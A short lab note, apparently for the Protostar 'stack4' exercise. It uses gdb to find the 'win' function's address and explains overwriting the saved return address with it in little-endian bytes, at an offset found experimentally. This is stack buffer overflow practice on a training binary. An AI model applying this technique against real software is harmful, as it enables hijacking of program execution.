For the address of the win function:
load the debug information with gdb:
  gdb /opt/protostar/bin/stack4
In the gdb console run
  info address win
to get the address of the function (0x080483f4 in this case)
Then change the return address of the stack, the offset has been found experimentally (in this case 13 bytes)
0x080483f4 (little endian) -> 0xf4 0x83 0x04 0x08
